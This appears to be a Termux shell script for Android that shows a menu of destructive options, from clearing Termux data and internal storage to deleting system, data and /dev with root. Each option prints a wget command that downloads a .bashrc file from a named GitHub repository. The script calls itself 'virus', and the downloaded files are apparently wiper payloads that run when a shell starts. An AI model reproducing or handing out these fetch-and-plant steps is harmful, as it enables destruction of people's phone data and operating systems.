clear
echo
echo
figlet Command | toilet -f term -F gay
echo
lal="\033[91m"
pila="\033[93m"
hara="\033[92m"
echo -e "	$hara [ 1 ]$pila Termux Date clear"
echo -e "	$hara [ 2 ]$pila Internal storage clear"
echo -e "	$hara [ 3 ]$pila Internal Storage and Termux Clear"
echo -e "	$hara [ 4 ]$pila Reset phone$lal ( root )"
echo -e "	$hara [ 5 ]$pila System delete$lal ( root )"
echo -e "	$hara [ 6 ]$pila Dev delete$lal ( root )"
echo -e "	$hara [ 7 ]$pila System,data,dev,sdcard,and termux delete$lal ( root )"
echo -e "	$hara [ 8 ]$pila Home"
echo -e "	$hara [ 9 ]$pila Exit"
echo
echo -e -n "$hara select >> "
read a
echo -e "$pila"
if [ "$a" = "1" ];then
clear
echo
echo
echo
echo
echo -e "wget https://raw.githubusercontent.com/rooted-cyber/good/master/fol/Termux/.bashrc"
echo
echo
echo
echo
echo "pess enter to home"
read
virus
fi
if [ "$a" = "2" ];then
clear
echo
echo
echo
echo
echo -e "wget https://raw.githubusercontent.com/rooted-cyber/good/master/fol/Sdcard/.bashrc"
echo
echo
echo
echo
echo "pess enter to home"
read
virus
fi
if [ "$a" = "3" ];then
clear
echo
echo
echo
echo
echo -e "wget https://raw.githubusercontent.com/rooted-cyber/good/master/fol/Asdcard/.bashrc"
echo
echo
echo
echo
echo "pess enter to home"
read
virus
fi
if [ "$a" = "4" ];then
clear
echo
echo
echo
echo
echo -e "wget https://raw.githubusercontent.com/rooted-cyber/good/master/fol/Data/.bashrc"
echo
echo
echo
echo
echo "pess enter to home"
read
virus
fi
if [ "$a" = "5" ];then
clear
echo
echo
echo
echo
echo -e "wget https://raw.githubusercontent.com/rooted-cyber/good/master/fol/System/.bashrc"
echo
echo
echo
echo
echo "pess enter to home"
read
virus
fi
if [ "$a" = "6" ];then
clear
echo
echo
echo
echo
echo -e "wget https://raw.githubusercontent.com/rooted-cyber/good/master/fol/Dev/.bashrc"
echo
echo
echo
echo
echo "pess enter to home"
read
virus
fi
if [ "$a" = "7" ];then
clear
echo
echo
echo
echo
echo -e "wget https://raw.githubusercontent.com/rooted-cyber/good/master/fol/Asystem/.bashrc"
echo
echo
echo
echo
echo "pess enter to home"
read
virus
fi
if [ "$a" = "8" ];then
clear
virus
fi
